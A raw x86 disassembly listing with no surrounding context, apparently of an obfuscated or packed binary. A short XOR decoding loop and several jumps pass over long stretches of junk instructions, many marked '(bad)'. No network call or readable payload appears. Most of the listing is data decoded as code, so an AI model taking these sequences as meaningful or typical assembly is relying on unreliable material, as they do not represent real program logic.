  4049c9:	aam    0x62
  4049cb:	stc    
  4049cc:	dec    esp
  4049cd:	add    esp,DWORD PTR [eax-0x57]
  4049d0:	xchg   ecx,eax
  4049d1:	push   0x7c31377d
  4049d6:	push   ss
  4049d7:	xchg   DWORD PTR [eax+0x4676fdb3],eax
  4049dd:	out    0xb6,al
  4049df:	push   edi
  4049e0:	mov    edi,DWORD PTR [ebp+0x8]
  4049e3:	sbb    DWORD PTR ds:0x43371b,ebx
  4049e9:	mov    eax,0x8a3a
  4049ee:	xor    DWORD PTR ds:0x4336b3,0x2227
  4049f8:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4049fd:	movzx  edi,WORD PTR ds:0x433653
  404a04:	sbb    DWORD PTR ds:0x4336f3,edi
  404a0a:	mov    edi,0x3b00
  404a0f:	add    DWORD PTR ds:0x433723,0x4336f3
  404a19:	add    ax,di
  404a1c:	movzx  eax,ax
  404a1f:	mov    DWORD PTR [ebp-0x14],eax
  404a22:	mov    eax,DWORD PTR [ebp+0x8]
  404a25:	movzx  eax,WORD PTR [eax+edx*4]
  404a29:	xor    eax,0x8a3a
  404a2e:	xor    DWORD PTR ds:0x433733,0x619a
  404a38:	add    eax,edi
  404a3a:	mov    edi,DWORD PTR [ebp-0x14]
  404a3d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404a41:	mov    eax,DWORD PTR [ebp-0xc]
  404a44:	inc    edx
  404a45:	cmp    edx,eax
  404a47:	jne    0x4049e0
  404a4d:	pop    edi
  404a4e:	pop    ebx
  404a4f:	mov    eax,DWORD PTR [ebp-0x8]
  404a52:	mov    edx,DWORD PTR [ebp+0x10]
  404a55:	xor    eax,ecx
  404a57:	add    eax,esi
  404a59:	mov    DWORD PTR [edx],eax
  404a5b:	mov    eax,DWORD PTR [ebp-0x8]
  404a5e:	jmp    0x404c30
  404a63:	das    
  404a64:	or     DWORD PTR [eax-0x16825d93],eax
  404a6a:	pop    ebp
  404a6b:	out    0xe3,al
  404a6d:	sub    ecx,DWORD PTR [ebx+0x1f]
  404a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a71:	push   cs
  404a72:	ret    0x2d84
  404a75:	jl     0x404af3
  404a77:	stos   DWORD PTR es:[edi],eax
  404a78:	jg     0x404af6
  404a7a:	jl     0x404a3d
  404a7c:	cmc    
  404a7d:	mov    WORD PTR [ecx],es
  404a7f:	push   cs
  404a80:	outs   dx,BYTE PTR ds:[esi]
  404a81:	sub    al,0xc4
  404a83:	pop    ds
  404a84:	(bad)  
  404a85:	jbe    0x404a17
  404a87:	cmp    ah,cl
  404a89:	into   
  404a8a:	outs   dx,DWORD PTR ds:[esi]
  404a8b:	sbb    DWORD PTR [ecx+edi*8-0x3cf3ca54],esi
  404a92:	leave  
  404a93:	or     ch,BYTE PTR [ebp+0x69]
  404a96:	fistp  DWORD PTR [ebp+0x496dd011]
  404a9c:	je     0x404a79
  404a9e:	jns    0x404aff
  404aa0:	std    
  404aa1:	aad    0x57
  404aa3:	cs mov ebx,0x6c5c8201
  404aa9:	addr16 aam 0xb2
  404aac:	push   esi
  404aad:	mov    bl,0xec
  404aaf:	pop    ebx
  404ab0:	mov    ebp,0xd64f4c90
  404ab5:	into   
  404ab6:	push   eax
  404ab7:	mov    ebx,0x5386dbf4
  404abc:	inc    eax
  404abd:	mov    ds,WORD PTR [eax-0x68628677]
  404ac3:	jo     0x404a90
  404ac5:	inc    edx
  404ac6:	mov    cl,0xfa
  404ac8:	add    DWORD PTR [ecx-0x13],ecx
  404acb:	inc    edi
  404acc:	test   DWORD PTR [ebp-0x1d],esi
  404acf:	fwait
  404ad0:	mov    ch,0x52
  404ad2:	in     al,0x5b
  404ad4:	jbe    0x404b30
  404ad6:	outs   dx,BYTE PTR ds:[esi]
  404ad7:	mov    cl,0xe2
  404ad9:	mov    esp,0xba389d61
  404ade:	scas   eax,DWORD PTR es:[edi]
  404adf:	push   cs
  404ae0:	sbb    al,0x78
  404ae2:	nop
  404ae3:	into   
  404ae4:	add    bl,al
  404ae6:	jge    0x404a69
  404ae8:	push   ebx
  404ae9:	and    esp,DWORD PTR [eax]
  404aeb:	fidivr WORD PTR [edx-0x342a18fe]
  404af1:	pop    ds
  404af2:	fcom   DWORD PTR [ebx]
  404af4:	pop    es
  404af5:	xchg   edi,eax
  404af6:	mov    eax,0x52dd893b
  404afb:	dec    edi
  404afc:	mov    al,ds:0x227af67
  404b01:	aaa    
  404b02:	ins    DWORD PTR es:[edi],dx
  404b03:	imul   BYTE PTR [esi+0x6]
  404b06:	es addr16 std 
  404b09:	shl    BYTE PTR [ebx-0x3095a196],0xba
  404b10:	mov    WORD PTR [ecx+0x6a],ss
  404b13:	dec    esp
  404b14:	mov    dh,0xb5
  404b16:	fstp   QWORD PTR [ecx-0x42d48f14]
  404b1c:	mov    edi,0x96c03787
  404b21:	shl    DWORD PTR [ebx+eiz*2+0x69],0xb2
  404b26:	and    eax,DWORD PTR [ebx+0x436e952e]
  404b2c:	and    eax,0xc185b29f
  404b31:	mov    fs,ebx
  404b33:	ret    0xc8b2
  404b36:	pop    esp
  404b37:	xchg   esp,eax
  404b38:	js     0x404ba3
  404b3a:	neg    al
  404b3c:	push   esp
  404b3d:	mov    bh,0x1f
  404b40:	dec    edi
  404b41:	mov    ah,dh
  404b43:	sbb    bh,dl
  404b45:	adc    DWORD PTR [ebp+0x55f4f4ae],0xa468f1b3
  404b4f:	sub    al,0x1e
  404b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b52:	stos   BYTE PTR es:[edi],al
  404b53:	repz gs addr16 adc eax,0x8f210159
  404b5b:	ins    BYTE PTR es:[edi],dx
  404b5c:	mov    edi,0x3db29e38
  404b61:	idiv   esi
  404b63:	mov    bh,0xd6
  404b65:	test   BYTE PTR [edi],dh
  404b67:	arpl   WORD PTR [edx+ebp*2+0x3f],sp
  404b6b:	(bad)  
  404b6c:	mov    bh,0x6a
  404b6e:	out    dx,al
  404b6f:	aas    
  404b70:	bound  edi,QWORD PTR [ebp+0x7742f74e]
  404b76:	xchg   edx,eax
  404b77:	cwde   
  404b78:	and    esi,DWORD PTR [eax]
  404b7a:	jge    0x404afc
  404b7c:	add    al,BYTE PTR [ecx]
  404b7e:	out    dx,al
  404b7f:	or     BYTE PTR [ebp+esi*1+0xd9f11b3],bh
  404b86:	adc    esp,DWORD PTR [edx+0x47297fd1]
  404b8c:	scas   eax,DWORD PTR es:[edi]
  404b8d:	hlt    
  404b8e:	scas   eax,DWORD PTR es:[edi]
  404b8f:	loop   0x404b2f
  404b91:	sub    eax,0x70b58ec
  404b96:	or     DWORD PTR [edx],eax
  404b98:	cld    
  404b99:	sti    
  404b9a:	mov    WORD PTR [edx-0x4],gs
  404b9d:	sti    
  404b9e:	inc    ecx
  404b9f:	nop
  404ba0:	cld    
  404ba1:	add    DWORD PTR [edi+0x47708ed1],eax
  404ba7:	push   cs
  404ba8:	add    ebx,DWORD PTR [esi+0x2bba1b42]
  404bae:	xor    bh,dh
  404bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bb2:	xor    edi,DWORD PTR [ecx]
  404bb4:	or     al,0x11
  404bb6:	ror    DWORD PTR [ebp+0x464aaad4],1
  404bbc:	sar    BYTE PTR [ebx-0x611ed1e4],cl
  404bc2:	add    ecx,DWORD PTR [esi-0x77]
  404bc5:	lods   al,BYTE PTR ds:[esi]
  404bc6:	call   0xa736:0xd1e598bb
  404bcd:	jle    0x404bb7
  404bcf:	ret    0x3115
  404bd2:	mov    cl,0x4f
  404bd4:	call   0xe57e:0xf92eb235
  404bdb:	fldenv ds:0x4877633
  404be1:	mov    esp,0xaa7a49f
  404be6:	xchg   esp,eax
  404be7:	mov    dh,0x45
  404be9:	xchg   esi,eax
  404bea:	mov    eax,0x4de9a7e3
  404bef:	pop    edx
  404bf0:	inc    eax
  404bf1:	popf   
  404bf2:	or     DWORD PTR [edx+0x56],0xbd04578f
  404bf9:	hlt    
  404bfa:	push   cs
  404bfb:	cli    
  404bfc:	mov    eax,0xb771718b
  404c01:	xor    cl,cl
  404c03:	loop   0x404c0a
  404c05:	bound  edx,QWORD PTR [esi+0x59]
  404c08:	jmp    0x404bdc
  404c0a:	mov    ds:0x22cf5ec5,eax
  404c0f:	adc    ebx,DWORD PTR [esi+esi*4]
  404c12:	ret    0x3e32
  404c15:	mov    dh,0xd5
  404c17:	and    al,0xdd
  404c19:	add    ebp,0xedf5b11d
  404c1f:	and    esi,DWORD PTR [ebx-0x2c]
  404c22:	or     BYTE PTR [eax],0x10
  404c25:	jge    0x404c96
  404c27:	test   al,0x37
  404c29:	loope  0x404bb4
  404c2b:	pop    ecx
  404c2c:	lea    edi,gs:[esi]
  404c2f:	repz xor eax,ecx
  404c32:	add    eax,esi
  404c34:	mov    DWORD PTR [ebp+0x8],eax
  404c37:	mov    eax,DWORD PTR [ebp+0x8]
  404c3a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404c3e:	mov    dl,BYTE PTR [ebp-0x1]
  404c41:	cmp    al,dl
  404c43:	je     0x40502a
  404c49:	mov    eax,DWORD PTR [ebp+0x8]
  404c4c:	jmp    0x404e1e
  404c51:	adc    al,0xc9
  404c53:	mulps  xmm2,xmm1
  404c56:	pop    ecx
  404c57:	jbe    0x404cca
  404c59:	sti    
  404c5a:	lahf   
  404c5b:	dec    ecx
  404c5c:	xchg   ebx,eax
  404c5d:	jmp    0x33fd35ea
  404c62:	das    
  404c63:	jl     0x404ce1
  404c65:	stos   DWORD PTR es:[edi],eax
  404c66:	jg     0x404ce4
  404c68:	jl     0x404c18
  404c6a:	jl     0x404bfe
  404c6c:	ret    
  404c6d:	push   ebp
  404c6e:	sub    ecx,eax
  404c70:	out    dx,eax
  404c71:	pop    ss
  404c72:	sar    BYTE PTR [ebp+0x33312bb7],cl
  404c78:	pop    ebx
  404c79:	xor    cl,dh
  404c7b:	out    dx,eax
  404c7c:	and    cl,BYTE PTR [ebx]
  404c7e:	sbb    DWORD PTR [ebx+ecx*8],esi
  404c81:	lahf   
  404c82:	test   DWORD PTR [edx],0x9e5c5cde
  404c88:	add    eax,0x3db96a97
  404c8d:	hlt    
  404c8e:	or     edx,ecx
  404c90:	push   esi
  404c91:	sub    al,0x59
  404c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c94:	mov    bl,BYTE PTR [edx-0x6b5be495]
  404c9a:	(bad)
  404c9f:	je     0x404d18
  404ca1:	stc    
  404ca2:	scas   eax,DWORD PTR es:[edi]
  404ca3:	clc    
  404ca4:	xchg   BYTE PTR [ecx+0x3],bl
  404ca7:	test   al,0xc7
  404ca9:	mov    BYTE PTR [edx],al
  404cab:	cli    
  404cac:	sbb    eax,0x1c0cdf2c
  404cb1:	xchg   ecx,eax
  404cb2:	pop    ebx
  404cb3:	jmp    0xb8de9b6
  404cb8:	iret   
  404cb9:	inc    edx
  404cba:	xchg   cl,cl
  404cbc:	push   esp
  404cbd:	int    0xef
  404cbf:	shl    DWORD PTR [esi+edx*4],cl
  404cc2:	or     ebx,DWORD PTR [edi-0x24]
  404cc5:	into   
  404cc6:	in     eax,0xfe
  404cc8:	(bad)  
  404cca:	xchg   edx,eax
  404ccb:	out    0xdc,eax
  404ccd:	sbb    eax,0x55cee00
  404cd2:	stc    
  404cd3:	jae    0x404cd2
  404cd5:	mov    ebx,0xa9bcb74c
  404cda:	fisub  DWORD PTR [edi+ebp*1]
  404cdd:	add    al,0x66
  404cdf:	daa    
  404ce0:	imul   esi,DWORD PTR [edi-0x61],0x5
  404ce4:	or     DWORD PTR [edx+0x40],eax
  404ce7:	inc    esi
  404ce8:	jb     0x404cf5
  404cea:	jns    0x404d6a
  404cec:	mov    ecx,0xf5b5587b
  404cf1:	cmp    al,0xa6
  404cf3:	scas   al,BYTE PTR es:[edi]
  404cf4:	iret   
  404cf5:	fisttp WORD PTR [esi+0x60af793e]
  404cfb:	aaa    
  404cfc:	inc    edx
  404cfd:	pop    ebx
  404cfe:	add    esi,DWORD PTR [ebp-0x518a54f2]
  404d04:	test   eax,0x8bca4aae
  404d09:	cli    
  404d0a:	and    al,0x23
  404d0c:	stos   DWORD PTR es:[edi],eax
  404d0d:	scas   al,BYTE PTR es:[edi]
  404d0e:	rcl    DWORD PTR [esi+0x58],1
  404d11:	adc    al,0xa9
  404d13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d14:	mov    ebx,DWORD PTR [ecx+0x35]
  404d17:	in     eax,dx
  404d18:	push   ss
  404d19:	loop   0x404d7a
  404d1b:	push   0x146308e0
  404d20:	sub    DWORD PTR [esi],esp
  404d22:	inc    ebp
  404d23:	imul   ebx,DWORD PTR [edi+0x6d],0xce57e2e7
  404d2a:	dec    ecx
  404d2b:	push   0xaa5dbbb4
  404d30:	xchg   DWORD PTR [edx+0x3a],ecx
  404d33:	mov    fs,ecx
  404d35:	stos   BYTE PTR es:[edi],al
  404d36:	dec    esi
  404d37:	mov    fs,WORD PTR ds:0xbbbbe699
  404d3d:	iret   
  404d3e:	inc    esp
  404d3f:	sbb    al,0xa9
  404d41:	cmp    dl,BYTE PTR [edx]
  404d43:	xchg   esi,eax
  404d44:	push   ss
  404d45:	sub    al,BYTE PTR [edi+0xf]
  404d48:	mov    dh,0xa4
  404d4a:	leave  
  404d4b:	xchg   cl,al
  404d4d:	add    BYTE PTR [ebp+0x59beaf51],dl
  404d53:	cmp    eax,0xd6bbc823
  404d58:	lahf   
  404d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d5a:	jb     0x404d93
  404d5c:	mov    cl,0x47
  404d5e:	xor    dh,BYTE PTR [ecx-0x7a4f6ea5]
  404d64:	sbb    al,0xd4
  404d66:	out    0x58,eax
  404d68:	sbb    DWORD PTR [eax],esp
  404d6a:	inc    ecx
  404d6b:	daa    
  404d6c:	jp     0x404d14
  404d6e:	iret   
  404d6f:	mov    edi,0x2c5faa95
  404d74:	inc    esi
  404d75:	xor    dh,BYTE PTR [esp+esi*8]
  404d78:	pop    esp
  404d79:	pop    ebx
  404d7a:	mov    esp,0xe4adaad2
  404d7f:	call   0xb85:0x63e50784
  404d86:	cmc    
  404d87:	push   0x6e681ecb
  404d8c:	pop    ebx
  404d8d:	mov    ecx,0xe6360b02
  404d92:	xchg   esi,eax
  404d93:	stos   DWORD PTR es:[edi],eax
  404d94:	cmc    
  404d95:	adc    ah,BYTE PTR [esi]
  404d97:	inc    ecx
  404d98:	aas    
  404d99:	cld    
  404d9a:	jnp    0x404e01
  404d9c:	xchg   ah,dl
  404d9e:	outs   dx,DWORD PTR ds:[esi]
  404d9f:	xchg   esi,eax
  404da0:	jns    0x404de1
  404da2:	pop    edx
  404da3:	push   0x161fc3eb
  404da8:	xchg   ebp,eax
  404da9:	and    al,0x4c
  404dab:	mov    eax,ds:0x45f155c1
  404db0:	fild   QWORD PTR [esi-0x276a234c]
  404db6:	dec    ebx
  404db7:	(bad)  
  404db8:	ret    0x1981
  404dbb:	push   ss
  404dbc:	or     ah,BYTE PTR [edx+0x21]
  404dbf:	xor    DWORD PTR ds:0x80515cb9,eax
  404dc5:	jnp    0x404e01
  404dc7:	push   edi
  404dc8:	out    dx,al
  404dc9:	test   BYTE PTR [ecx],0x90
  404dcc:	not    DWORD PTR [edi-0x6f]
  404dcf:	scas   al,BYTE PTR es:[edi]
  404dd0:	(bad)
  404dd4:	ret    
  404dd5:	sti    
  404dd6:	mov    esp,DWORD PTR [ebx]
  404dd8:	pop    edx
  404dd9:	pop    edi
  404dda:	sahf   
  404ddb:	inc    cx
  404ddd:	inc    edx
  404dde:	jns    0x404e4a
  404de0:	xchg   edx,eax
  404de1:	(bad)  
  404de2:	outs   dx,DWORD PTR ds:[esi]
  404de3:	nop
  404de4:	(bad)  
  404de5:	in     eax,dx
  404de6:	or     al,0x67
  404de8:	jbe    0x404e46
  404dea:	leave  
  404deb:	pop    ss
  404dec:	clc    
  404ded:	stc    
  404dee:	cmp    eax,0x2349153b
  404df3:	ret    0x18d4
  404df6:	sub    edi,DWORD PTR [ebp+0x18]
  404df9:	cwde   
  404dfa:	inc    ebx
  404dfb:	repnz pop eax
  404dfd:	mov    al,ds:0xa55d9a2a
  404e02:	iret   
  404e03:	xor    eax,0x8909bf3e
  404e08:	arpl   WORD PTR ds:0x204ffd87,si
  404e0e:	mov    bh,0xf7
  404e10:	les    edi,FWORD PTR [eax-0x493e0807]
  404e16:	push   ss
  404e17:	arpl   WORD PTR [eax-0x6dea21a6],sp
  404e1d:	and    cl,BYTE PTR [edx-0x7457fabc]
  404e23:	push   ebp
  404e24:	or     al,0x3a
  404e26:	add    cl,BYTE PTR [edi]
  404e28:	test   ebp,esi
  404e2a:	add    eax,DWORD PTR [eax]
  404e2c:	add    BYTE PTR [ebx+0x558bf845],cl
  404e32:	or     al,0xf
  404e34:	mov    esi,0xe9c13312
  404e39:	int    0x1
  404e3b:	add    BYTE PTR [eax],al
  404e3d:	test   BYTE PTR [ecx-0x28a15a6],dh
  404e43:	xchg   esp,eax
  404e44:	jge    0x404e3a
  404e46:	int    0x4b
  404e48:	add    eax,0xaabdc46c
  404e4d:	outs   dx,BYTE PTR ds:[esi]
  404e4e:	cs jl  0x404ecd
  404e51:	stos   DWORD PTR es:[edi],eax
  404e52:	jg     0x404ed0
  404e54:	jl     0x404ea3
  404e56:	lods   eax,DWORD PTR ds:[esi]
  404e57:	jp     0x404e4d
  404e59:	cmp    DWORD PTR [edx+0x76],0xdc79baca
  404e60:	repnz data16 hlt 
  404e63:	adc    eax,0x2673821
  404e68:	(bad)  
  404e69:	push   0xffffffd5
  404e6b:	sub    DWORD PTR [esp+edi*4+0x10676b75],ebp
  404e72:	mov    al,0xe0
  404e74:	inc    ebx
  404e75:	test   BYTE PTR [edi+edx*8],dh
  404e78:	cmp    BYTE PTR ds:0xfe5ff2c2,al
  404e7e:	or     edi,esp
  404e80:	retf   
  404e81:	test   BYTE PTR [eax],cl
  404e83:	frstor [ebx+0x547c7faa]
  404e89:	or     al,BYTE PTR [edi-0x54]
  404e8c:	sub    eax,0xabb4fdb5
  404e91:	cmc    
  404e92:	outs   dx,DWORD PTR ds:[esi]
  404e93:	lock push ebp
  404e95:	jnp    0x404e1a
  404e97:	test   DWORD PTR [esi],esi
  404e99:	dec    ebp
  404e9a:	pop    ebp
  404e9b:	mov    al,0xd9
  404e9d:	mov    DWORD PTR [edx],ebx
  404e9f:	dec    ecx
  404ea0:	cdq    
  404ea1:	sbb    BYTE PTR [eax],dl
  404ea3:	mov    edx,0x7a75bde1
  404ea8:	jo     0x404eaf
  404eaa:	dec    ebx
  404eab:	mov    BYTE PTR [edx],dh
  404ead:	ins    DWORD PTR es:[edi],dx
  404eae:	and    DWORD PTR [ebx-0x5a],ebx
  404eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404eb2:	inc    eax
  404eb3:	(bad)  
  404eb4:	xor    edx,eax
  404eb6:	call   DWORD PTR [ebx+0x502e0bed]
  404ebc:	fist   DWORD PTR [ebx+0x4d543c89]
  404ec2:	mov    dh,0x47
  404ec4:	jle    0x404e4b
  404ec6:	pop    esi
  404ec7:	push   esp
  404ec8:	retf   
  404ec9:	mov    WORD PTR [esi],gs
  404ecb:	xor    eax,0x47fc382e
  404ed0:	xchg   esp,eax
  404ed1:	inc    edx
  404ed2:	pop    edx
  404ed3:	pop    eax
  404ed4:	or     bh,BYTE PTR [esi]
  404ed6:	cmp    bh,bl
  404ed8:	cld    
  404ed9:	out    dx,al
  404eda:	sub    eax,0x6e7d62cf
  404edf:	mov    al,0x3e
  404ee1:	mov    eax,0x63618618
  404ee6:	add    DWORD PTR [eax+ecx*4-0x58],esi
  404eea:	dec    ecx
  404eeb:	rol    dh,1
  404eed:	mov    eax,ds:0xaa173b58
  404ef2:	push   cs
  404ef3:	inc    eax
  404ef4:	sub    al,0xa0
  404ef6:	shl    BYTE PTR [eax+ebp*2+0x2d],0x4f
  404efb:	mov    cl,0xa3
  404efd:	mov    cs,WORD PTR [edi]
  404eff:	jl     0x404f2e
  404f01:	xor    al,0xd2
  404f03:	loop   0x404eaa
  404f05:	mov    eax,ds:0xc605af7f
  404f0a:	dec    ecx
  404f0b:	xor    BYTE PTR [esi+0x74d813bb],dh
  404f11:	test   al,ah
  404f13:	dec    ebp
  404f14:	test   eax,0x25d587af
  404f19:	mov    eax,0x31675659
  404f1e:	lods   eax,DWORD PTR ds:[esi]
  404f1f:	mov    ch,0x47
  404f21:	ret    0x2c54
  404f24:	je     0x404f43
  404f26:	ins    DWORD PTR es:[edi],dx
  404f27:	adc    BYTE PTR [esi-0x5e3be7f0],bl
  404f2d:	repz mov edx,0x6f67cdb5
  404f33:	jmp    0x404ef2
  404f35:	(bad)  [ebx-0x31]
  404f38:	mov    ch,0x11
  404f3a:	pushf  
  404f3b:	inc    ebx
  404f3c:	adc    ah,BYTE PTR [esi+0x59dfc311]
  404f42:	into   
  404f43:	and    BYTE PTR [eax+0x39901d1e],ah
  404f49:	inc    esp
  404f4a:	and    al,0x50
  404f4c:	xlat   BYTE PTR ds:[bx]
  404f4e:	in     eax,dx
  404f4f:	ja     0x404f44
  404f51:	push   es
  404f52:	out    0x70,eax
  404f54:	into   
  404f55:	mov    BYTE PTR [eax+0x4d450d8e],ah
  404f5b:	ins    BYTE PTR es:[edi],dx
  404f5c:	push   edx
  404f5d:	wbinvd 
  404f5f:	shl    bh,cl
  404f61:	add    bh,bh
  404f63:	add    BYTE PTR [ebx+0x37],0x4a
  404f67:	(bad)  
  404f69:	rol    dh,cl
  404f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f6c:	imul   ebp,DWORD PTR [esp+eax*8-0x33],0xbcc1004a
  404f74:	loop   0x404fe4
  404f76:	add    eax,0x301cf0cb
  404f7c:	rol    BYTE PTR [ecx],cl
  404f7e:	inc    ecx
  404f7f:	addr16 xchg ecx,eax
  404f81:	inc    edx
  404f82:	sbb    eax,0x5ef3861e
  404f87:	jmp    0xc4c82a0a
  404f8c:	ds clc 
  404f8e:	jae    0x404fe5
  404f90:	sub    ebp,ebp
  404f92:	hlt    
  404f93:	cmp    bl,BYTE PTR [edx]
  404f95:	lds    edx,FWORD PTR [ecx-0x149feff6]
  404f9b:	ret    0x99b1
  404f9e:	mov    ch,0xf3
  404fa0:	test   eax,0xce131a40
  404fa5:	dec    ebp
  404fa6:	xor    eax,0x51c35b35
  404fab:	and    esp,DWORD PTR [edx]
  404fad:	dec    eax
  404fae:	mov    ebx,0xe91fa423
  404fb3:	pushf  
  404fb4:	pop    edx
  404fb5:	aas    
  404fb6:	push   ds
  404fb7:	(bad)  
  404fb9:	sbb    BYTE PTR [eax-0x61bc2bc8],0x74
  404fc0:	and    ebp,edi
  404fc2:	pop    ds
  404fc3:	xor    eax,0xad8aa1d1
  404fc8:	or     BYTE PTR [ebx],ch
  404fca:	out    0x4d,eax
  404fcc:	mov    ebx,0xa7cb959a
  404fd1:	xchg   esi,eax
  404fd2:	adc    DWORD PTR [eax-0x71],ebx
  404fd5:	imul   DWORD PTR [edx]
  404fd7:	daa    
  404fd8:	fistp  WORD PTR [esi-0x6e]
  404fdb:	adc    BYTE PTR [eax+0x58197359],dl
  404fe1:	das    
  404fe2:	sbb    ecx,esi
  404fe4:	test   BYTE PTR [ecx],0xc0
  404fe7:	add    ebx,DWORD PTR [ebp-0x6f]
  404fea:	push   ecx
  404feb:	(bad)  
  404fec:	out    dx,eax
  404fed:	jecxz  0x405063
  404fef:	lds    ebx,FWORD PTR [ecx+0x6]
  404ff2:	je     0x404feb
  404ff4:	test   eax,0xd93b3e73
  404ff9:	mov    ecx,0xd3b7bfa1
  404ffe:	dec    edx
  404fff:	loop   0x404fee
  405001:	pop    eax
  405002:	pushf  
  405003:	dec    edx
  405004:	jbe    0x40501f
  405006:	mov    ebx,0x3e00e79
  40500b:	(bad)  
  40500c:	cmp    edx,eax
  40500e:	je     0x405216
  405014:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40501b:	lea    eax,[ebp-0x18]
  40501e:	mov    DWORD PTR [ebp-0x14],eax
  405021:	mov    eax,DWORD PTR [ebp-0x14]
  405024:	add    DWORD PTR [eax],0x705fa8f
  40502a:	mov    eax,DWORD PTR [ebp-0x10]
  40502d:	mov    edx,DWORD PTR [ebp+0x8]
  405030:	xor    eax,ecx
  405032:	jmp    0x405204
  405037:	das    
  405038:	dec    ebx
  405039:	sbb    al,0x9b
  40503b:	pop    eax
  40503c:	imul   ebp,DWORD PTR [ebx-0x6bdfc3b5],0xfffffff0
  405043:	dec    esp
  405044:	pop    edx
  405045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405046:	les    esp,FWORD PTR [ebp-0x548383d8]
  40504c:	jg     0x4050ca
  40504e:	jl     0x405072
  405050:	(bad)  
  405051:	jb     0x4050cc
  405053:	imul   esp,DWORD PTR [edx+eax*4-0x40a20537],0xffffffa2
  40505b:	mov    ecx,ebx
  40505d:	lods   al,BYTE PTR ds:[esi]
  40505e:	jmp    0x405011
  405060:	add    BYTE PTR [edi+0x475c461c],ah
  405066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405067:	inc    eax
  405068:	sbb    cl,BYTE PTR [ebx-0x17]
  40506b:	or     bh,BYTE PTR [esi-0x67]
  40506e:	xchg   edi,eax
  40506f:	ficomp WORD PTR [eax-0x33f18a82]
  405075:	rcl    ebx,0xae
  405078:	sub    ebp,esi
  40507a:	mov    esi,0x5b813ec9
  40507f:	fadd   QWORD PTR [ebx-0x53]
  405082:	xchg   edx,eax
  405083:	xchg   BYTE PTR [ebx+0x7b2d35b2],bh
  405089:	inc    ebx
  40508a:	push   ebx
  40508b:	loope  0x40501c
  40508d:	xchg   BYTE PTR [esi],cl
  40508f:	mov    eax,0xa4fb828c
  405094:	mov    ebp,0x3be24bac
  405099:	lds    esp,FWORD PTR [ebp+edi*1+0x29]
  40509d:	add    BYTE PTR [ebp+0x26],dl
  4050a0:	xchg   DWORD PTR [edx+0x20878b7b],ecx
  4050a6:	mov    ds:0xe99fc5b9,eax
  4050ab:	inc    edx
  4050ac:	xchg   ecx,eax
  4050ad:	pop    edi
  4050ae:	add    DWORD PTR [edi-0x1e],esp
  4050b1:	pop    esi
  4050b2:	xchg   ecx,eax
  4050b3:	ffree  st(0)
  4050b5:	xor    cl,BYTE PTR [esi+ecx*1-0x10]
  4050b9:	clc    
  4050ba:	rol    DWORD PTR [ebx+0x45a6d454],0x67
  4050c1:	push   ebx
  4050c2:	pop    es
  4050c3:	sub    ch,BYTE PTR [ebx-0x5ebde2cb]
  4050c9:	aaa    
  4050ca:	dec    ebp
  4050cb:	inc    ebp
  4050cc:	out    dx,eax
  4050cd:	sbb    DWORD PTR [ebp-0x4a7f3bf3],0xde9cddf7
  4050d7:	jp     0x40512d
  4050d9:	dec    ecx
  4050da:	sbb    DWORD PTR [esi-0x5c],0xef8fed54
  4050e1:	out    dx,eax
  4050e2:	mov    ecx,0x3b4024de
  4050e7:	aad    0x40
  4050e9:	add    eax,DWORD PTR [ecx+0x23]
  4050ec:	clc    
  4050ed:	xchg   edi,eax
  4050ee:	cli    
  4050ef:	mov    WORD PTR [edx],es
  4050f1:	out    0xf7,al
  4050f3:	das    
  4050f4:	bound  eax,QWORD PTR [eax]
  4050f6:	jle    0x4050e7
  4050f8:	ja     0x4050a9
  4050fa:	imul   eax,eax,0xfffffffc
  4050fd:	movhps QWORD PTR [edx],xmm2
  405100:	scas   al,BYTE PTR es:[edi]
  405101:	cdq    
  405102:	push   0xfffffff7
  405104:	popf   
  405105:	lods   eax,DWORD PTR ds:[esi]
  405106:	leave  
  405107:	hlt    
  405108:	ret    
  405109:	mov    cl,0x23
  40510b:	or     al,0xe6
  40510d:	mov    esi,0x9d1f8133
  405112:	test   eax,0xc1f982a9
  405117:	mov    ebp,eax
  405119:	fwait
  40511a:	aad    0xaf
  40511c:	test   DWORD PTR [edi],esp
  40511e:	inc    ecx
  40511f:	daa    
  405120:	sbb    eax,ebp
  405122:	rcr    DWORD PTR ds:0xdf1d9464,1
  405128:	(bad)  
  405129:	cld    
  40512a:	std    
  40512b:	leave  
  40512c:	push   ecx
  40512d:	arpl   cx,si
  40512f:	out    dx,al
  405130:	lods   al,BYTE PTR ds:[esi]
  405131:	cwde   
  405132:	xlat   BYTE PTR ds:[ebx]
  405133:	push   ecx
  405134:	sub    al,0x32
  405136:	mov    ds:0x46482f5e,al
  40513b:	mov    DWORD PTR [eax-0x1],esi
  40513e:	jl     0x405184
  405140:	mov    eax,0xc31d19dd
  405145:	ds imul edi,eax,0x7c
  405149:	loope  0x405153
  40514b:	jg     0x405198
  40514d:	inc    eax
  40514e:	addr16 xchg ebp,eax
  405150:	lea    edi,[ecx-0x43ee88d1]
  405156:	imul   ebx,DWORD PTR [esi-0x63802cc7],0x7bba61d9
  405160:	jae    0x4051b1
  405162:	call   0x5c93:0xed463a0d
  405169:	add    bh,dh
  40516b:	sbb    eax,0x693e8062
  405170:	js     0x40516a
  405172:	mov    bl,0x94
  405174:	not    BYTE PTR [esi]
  405176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405177:	xchg   DWORD PTR [edi-0x61],esp
  40517a:	adc    edx,esp
  40517c:	sub    DWORD PTR [ecx+0x1d595f78],esi
  405182:	lods   al,BYTE PTR ds:[esi]
  405183:	or     ch,BYTE PTR ds:0x36d4477f
  405189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40518a:	xchg   ecx,eax
  40518b:	arpl   WORD PTR [eax],dx
